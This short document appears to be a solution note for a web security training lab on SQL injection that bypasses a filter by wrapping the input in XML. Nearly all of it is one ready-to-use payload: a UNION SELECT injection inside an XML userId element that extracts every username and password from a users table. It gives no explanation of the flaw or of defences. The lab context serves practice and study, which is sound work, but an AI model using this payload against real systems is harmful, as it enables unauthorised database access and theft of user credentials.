# Lab: SQL injection with filter bypass via XML encoding

## Objective
Perform the attack to solve SQL injection with filter bypass via XML encoding.

## Payload
```text
<@xml><userId>1' UNION SELECT username || '~' || password FROM users--</userId></@xml>
```
